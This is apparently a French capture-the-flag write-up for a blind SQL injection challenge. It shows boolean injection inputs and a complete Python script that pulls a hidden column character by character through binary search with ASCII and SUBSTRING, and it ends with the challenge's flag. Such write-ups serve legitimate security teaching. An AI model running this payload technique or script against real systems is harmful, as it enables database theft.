# Writeup - Injection SQL #3: Mais je le vois pas!

La requête pour ce défi est:

```sql
SELECT id,flag FROM challenge3 WHERE id='NOTRE_INPUT';
```

Cette fois on nous dit seulement s'il y a des résultats pour notre requête ou non; même chose pour les erreurs. Ceci peut sembler être une absence d'information, mais il s'agit en fait d'une information booléenne. En Utilisant judicieusement cette dernière, on peut reconstruire des informations plus complexes morceaux par morceaux en "posant des questions" vrai ou faux. Par exemple, si je veux savoir combien il y a d'entrée dans la table, je peux voir s'il y a des résultats quand je regarde uniquement la 1ère ligne de résultats, puis la 2è et ainsi de suite:

```sql
 -- Entrée
' OR ''='' LIMIT 1 OFFSET 0 --
 -- Requête
 SELECT id,flag FROM challenge3 WHERE id='' OR ''='' LIMIT 1 OFFSET 0 -- ';
 -- Résultat = Votre requête a retourné au moins un résultat


 -- Entrée
' OR ''='' LIMIT 1 OFFSET 1 --
 -- Requête
 SELECT id,flag FROM challenge3 WHERE id='' OR ''='' LIMIT 1 OFFSET 1 -- ';
 -- Résultat= Votre requête n'a retourné aucun résultat
```

Avec les deux requêtes précédentes, on peut apprendre qu'il n'y a qu'une seule entrée dans la table. On peut appliquer le même principe pour retrouver chacun des caractères du contenu de la colonne `flag`. Ceci demande beaucoup de requêtes et nous allons donc le scripter. Il y a plus d'une manière de faire. Dans le script suivant, nous utiliserons les fonctions SQL `ASCII` et `SUBSTRING` pour effectuer une recherche binaire sur la valeur de chacun des caractères du flag.

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
import requests

URL = "https://unitedctf.ca:18000/challenge3.php"
HEADERS = {}

query = "' OR ASCII(SUBSTRING(flag, {}, 1)) > {} -- " # Placeholders are for Position and ascii value respectively
validate = "' OR flag='{}"

def find_next_letter(index):
    resp = requests.Response()
    low = 0
    high = 0x7f # Maximum value in ASCII range

    # Use binary search over the ASCII range. Faster than enumerating each character
    while high > low:
        char = (low + high) // 2
        try:
            resp = requests.post(URL, data={"flagID": query.format(index, char)}, headers=HEADERS)
        except ConnectionError as e:
            print(e)
        if "au moins un résultat" in resp.text:
            low = char + 1
        else:
            high = char
    return chr(low)

def find_password():
    currentPass = ""
    while "au moins un résultat" not in requests.post(URL, data={"flagID": validate.format(currentPass)}, headers=HEADERS).text:
        currentPass += find_next_letter(len(currentPass) + 1) #SUBSTRING is 1-indexed
        print(currentPass) # See the flag being built char by char on the screen. This is fun to watch and prevents you from thinking the script is stuck
    return currentPass

print("Flag: " + find_password())
```

Flag: **FLAG-In_the_Land_of_Mariadb_where_the_Columns_lie_@>#;rF2T7}8-l3rO**
